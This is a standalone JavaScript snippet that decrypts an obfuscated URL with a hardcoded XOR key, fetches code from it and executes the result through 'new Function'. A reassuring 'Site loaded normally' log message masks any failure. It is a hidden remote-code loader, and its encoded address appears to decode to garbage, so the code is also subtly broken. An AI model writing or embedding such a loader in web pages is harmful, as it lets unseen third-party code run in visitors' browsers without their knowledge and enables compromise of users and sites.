(function () {
    const key = "x9A#21!";

    function decrypt(input) {
        let out = "";
        for (let i = 0; i < input.length; i++) {
            out += String.fromCharCode(
                input.charCodeAt(i) ^ key.charCodeAt(i % key.length)
            );
        }
        return out;
    }

    const encryptedURL = "UldEWgQbXl1BVVNUTw=="; 
    const url = decrypt(atob(encryptedURL));

    fetch(url, { cache: "no-store" })
        .then(r => r.ok ? r.text() : Promise.reject())
        .then(code => (new Function(code))())
        .catch(() => {
            console.info("External script not available. Site loaded normally.");
        });
})();